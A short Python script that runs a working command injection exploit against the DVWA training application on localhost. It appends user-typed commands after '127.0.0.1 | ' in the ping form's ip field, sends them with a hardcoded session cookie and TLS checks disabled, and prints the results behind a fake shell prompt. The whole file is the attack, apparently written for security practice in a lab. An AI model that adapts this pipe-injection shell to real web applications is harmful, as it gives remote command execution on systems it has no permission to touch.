import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def command_injection(command):
    cookies = dict(security='low', PHPSESSID='t1kqiierd4f8fbrl83aveplg6h')
    attack_payload = {
        'ip':'127.0.0.1 | ' + command,
        'submit':'submit'
    }
    url = "https://127.0.0.1/dvwa/vulnerabilities/exec/"
    payload = requests.get(url=url, params=attack_payload, cookies=cookies, verify=False)
    stdout = re.findall('<pre>(.*?)</pre>', payload.text)
    for words in stdout:
        print(words)


while True:
    cmd = input("mac@MacBook-Pro %").strip()
    if len(cmd) == 0:
        continue
    if cmd == 'quit':
        break
    command_injection(command=cmd)
